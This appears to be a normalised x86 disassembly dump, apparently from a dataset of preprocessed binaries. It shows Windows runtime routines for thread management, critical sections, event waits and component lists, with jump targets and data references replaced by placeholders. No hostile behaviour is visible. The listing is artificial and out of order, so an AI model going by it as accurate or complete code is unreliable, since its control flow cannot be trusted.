lea edx [ ebp - 0x4 ]
mov eax esi
call sub_3a67144
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_3a82bcc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a82cc4
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a82ccc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_3a82d74
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_3a66fd0
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
mov eax esi
call sub_3a65bfc
add eax eax
cmp ebx eax
jge r-xdata
sub ebx 0x4
mov ebx [ ebx ]
mov dl 0x12
mov eax edi
call sub_3a82d84
mov eax esi
call sub_3a65bfc
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov ecx 0x4
mov eax edi
call sub_3a809ec
mov ecx [ ebp - 0x8 ]
add ecx ecx
mov edx esi
mov eax edi
call sub_3a809ec
lea eax [ ebp - 0xc ]
mov edx esi
call sub_3a65528
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax edi
call sub_3a82bcc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a82d7b
lea eax [ ebp - 0xc ]
call sub_3a652a0
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a82d98
push ebp
mov ebp esp
push ebx
mov ebx [ eax + 0x20 ]
mov [ edx ] ebx
mov edx [ eax + 0x18 ]
mov [ ecx ] edx
mov edx [ ebp + 0xc ]
mov ecx [ eax + 0x1c ]
mov [ edx ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ eax + 0x28 ]
mov [ edx ] eax
pop ebx
pop ebp
retn 0x8
sub_3a82e54
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d410
call sub_3a64c34
call sub_3a82e08
mov eax ebx
call sub_3a82e14
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_3a83019
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3a82ffa
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a83001
mov eax [ ebp - 0xc ]
call sub_3a64380
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_3a7a494
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_3a7a388
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_3a82f9d
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_3a82f5e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a82fa4
push rw-data
call EnterCriticalSection
retn
sub_3a82f63
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
call sub_3a64c5c
call sub_3a62fa4
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ edx + 0x10 ] eax
jmp r-xdata
call sub_3a64cb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a82fa4
push rw-data
call EnterCriticalSection
retn
sub_3a82fa4
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx 0x18
call sub_3a62efc
mov edx 0xc
mov eax [ ebp - 0x8 ]
call sub_3a62efc
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call SetEvent
jmp r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_3a7a494
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_3a7a388
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_3a82f9d
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_3a82f5e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a83001
mov eax [ ebp - 0xc ]
call sub_3a64380
retn
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a82fa4
push rw-data
call EnterCriticalSection
retn
sub_3a8302c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0xf ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x1
call sub_3a82e30
test bl bl
je r-xdata
xor eax eax
push ebp
push sub_3a8306d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_3a65284
mov eax [ ebp - 0x4 ]
call sub_3a64380
sub_3a83072
call sub_3a62fa4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] eax
call sub_3a64cb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0xf ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x1
call sub_3a82e30
test bl bl
je r-xdata
mov eax esi
call sub_3a65284
mov eax [ ebp - 0x4 ]
call sub_3a64380
sub_3a830d4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x1 ] dl
mov esi eax
xor eax eax
push ebp
push sub_3a8317e
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_3a64350
call sub_3a82e3c
mov [ esi + 0xe ] bl
mov [ esi + 0xc ] bl
push esi
push 0x4
lea eax [ esi + 0x8 ]
push eax
mov ecx sub_3a8302c
xor edx edx
xor eax eax
call sub_3a65224
mov ebx eax
mov [ esi + 0x4 ] ebx
test ebx ebx
jne r-xdata
add esp 0xfffffff0
call sub_3a646e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a83185
lea eax [ ebp - 0x10 ]
call sub_3a652a0
retn
call GetLastError
lea edx [ ebp - 0x10 ]
call sub_3a6cae0
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d410
call sub_3a64c34
sub_3a831a4
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
cmp [ esi + 0x8 ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
mov edx esi
call sub_3a8330c
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a64370
mov eax [ esi + 0x38 ]
call sub_3a64380
call sub_3a82e48
test bl bl
jle r-xdata
push eax
call CloseHandle
mov eax esi
call sub_3a835b8
cmp [ esi + 0xc ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
mov eax esi
call sub_3a835c0
mov eax esi
call sub_3a83590
sub_3a83224
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov ebx edx
xor eax eax
push ebp
push sub_3a83292
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a83299
lea eax [ ebp - 0x14 ]
call sub_3a652a0
retn
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_3a6cae0
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d410
call sub_3a64c34
sub_3a832e0
push ebx
push esi
mov ebx edx
mov esi eax
movzx eax bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi + 0x4 ]
push eax
call SetThreadPriority
cmp eax 0x1
sbb edx edx
inc edx
mov eax esi
call sub_3a832a0
pop esi
pop ebx
retn
sub_3a8330c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_3a833be
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a833c5
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_3a7a494
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax [ ebx ]
cmp edi [ eax ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_3a7a388
mov eax [ ebx ]
mov edx 0x18
call sub_3a62efc
mov edx 0xc
mov eax ebx
call sub_3a62efc
mov eax [ ebx ]
mov eax [ eax + 0xc ]
cmp eax [ ebp + 0xc ]
jne r-xdata
sub_3a833cc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x5 ] cl
mov [ ebp - 0x4 ] edx
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
jmp r-xdata
lea eax [ ebp - 0x18 ]
mov [ ebp - 0xc ] eax
mov eax 0xc
call sub_3a62ee0
mov [ ebp - 0xc ] eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x8 ] edx
push 0x0
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov edx [ ebp - 0xc ]
mov [ edx + 0x8 ] eax
jmp r-xdata
movzx ebx [ ebp - 0x5 ]
xor bl 0x1
test bl bl
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax ] edx
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_3a7a33c
call sub_3a82e30
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_3a83542
push [ fs : eax ]
mov [ fs : eax ] esp
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_3a8351b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
movzx edx [ ebp - 0x5 ]
mov [ eax + 0x4 ] dl
cmp [ rw-data ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ eax ]
mov eax [ rw-data ]
call [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a83522
push rw-data
call LeaveCriticalSection
retn
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_3a834fc
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xffffffff
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
push eax
call WaitForSingleObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_3a83522
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
retn
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
push eax
call CloseHandle
sub_3a83568
push ebp
mov ebp esp
mov [ eax + 0x20 ] eax
xor edx edx
mov [ eax + 0x30 ] edx
mov edx [ ebp + 0x8 ]
mov [ eax + 0x28 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x2c ] edx
lea edx [ eax + 0x20 ]
xor ecx ecx
mov eax [ eax ]
call sub_3a833cc
pop ebp
retn 0x8
sub_3a83590
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x4 ]
push eax
call ResumeThread
mov esi eax
test esi esi
setge dl
mov eax ebx
call sub_3a832a0
dec esi
jne r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xe ] 0x0
sub_3a835c0
push ebx
push esi
add esp 0xffffffd8
mov esi eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x4 ] eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
push 0xffffffff
mov eax [ esp + 0x8 ]
push eax
call WaitForSingleObject
xor ebx ebx
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
push 0x40
push 0x3e8
push 0x0
lea eax [ esp + 0x10 ]
push eax
push 0x2
call MsgWaitForMultipleObjects
mov ebx eax
cmp ebx 0xffffffff
setne dl
mov eax esi
call sub_3a832a0
cmp ebx 0x1
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x1c ]
push eax
call PeekMessageA
test ebx ebx
jne r-xdata
xor eax eax
call sub_3a82e54
cmp ebx 0x2
jne r-xdata
jmp r-xdata
push esp
mov eax [ esp + 0x8 ]
push eax
call GetExitCodeThread
cmp eax 0x1
sbb edx edx
inc edx
mov eax esi
call sub_3a832a0
mov eax [ esp ]
add esp 0x28
pop esi
pop ebx
retn
sub_3a83664
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
movzx eax [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_3a83820
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a836b0
push ebx
push esi
push ecx
call sub_3a6478c
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_3a83918
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_3a838bc
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
movzx edx [ esp ]
and dl 0xfc
mov eax ebx
call sub_3a7aaa4
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_3a83884
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_3a64734
lea eax [ ebx + 0x14 ]
call sub_3a6efbc
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_3a7a494
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_3a83738
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_3a7a4f0
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_3a7a33c
mov edx ebx
mov eax esi
call sub_3a83738
sub_3a837cc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_3a7a33c
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebx + 0x10 ] eax
sub_3a837f8
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_3a7a630
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_3a64380
xor eax eax
mov [ ebx + 0x10 ] eax
sub_3a83820
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_3a6457c
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_3a837cc
mov dl 0x1
mov eax ebx
call sub_3a83d58
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx ebx
call sub_3a83884
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_3a83d08
sub_3a83884
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_3a83d58
mov edx ebx
mov eax esi
call sub_3a837f8
pop edi
pop esi
pop ebx
retn
sub_3a838bc
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_3a7a57c
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_3a83884
jmp r-xdata
movzx eax [ r-xdata ]
and ax [ esi + 0x1c ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_3a837f8
sub_3a83918
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_3a7a494
call sub_3a83918
inc edi
dec esi
jne r-xdata
sub_3a83954
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_3a7a630
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_3a64380
xor eax eax
mov [ ebx + 0x14 ] eax
sub_3a83978
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3a83954
mov edx ebx
mov eax esi
call sub_3a83954
pop esi
pop ebx
retn
sub_3a83994
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_3a83978
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_3a7a494
movzx ecx [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
cmp ebx [ eax + 0x8 ]
jl r-xdata
test ebx ebx
jge r-xdata
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
sub_3a839f4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_3a8378c
push ebx
push sub_3a837b4
movzx eax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_3a837a0
push ebx
push sub_3a837c0
movzx eax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_3a83aec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_3a69490
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_3a83b84
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d410
call sub_3a64c34
sub_3a83b84
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_3a7a494
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_3a69490
test al al
jne r-xdata
sub_3a83bd4
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_3a656c8
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
xor edx edx
mov eax esi
call sub_3a69754
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d410
call sub_3a64c34
xor edx edx
mov eax ebx
call sub_3a83d58
mov edx esi
mov eax ebx
call sub_3a83c64
mov dl 0x1
mov eax ebx
call sub_3a83d58
sub_3a83c78
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_3a7a494
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_3a7a420
sub_3a83cb4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_3a7a4f0
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_3a7a388
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_3a7a510
sub_3a83d08
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_3a83ca4
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_3a83c78
mov cl 0x1
mov edx ebx
call sub_3a83d08
inc edi
dec ebp
jne r-xdata
sub_3a83d58
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_3a6553c
mov edx esp
mov eax esi
call sub_3a64694
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_3a83da0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_3a83dc8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_3a83e10
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_3a64434
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_3a83e70
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_3a83e94
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_3a64350
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax edi
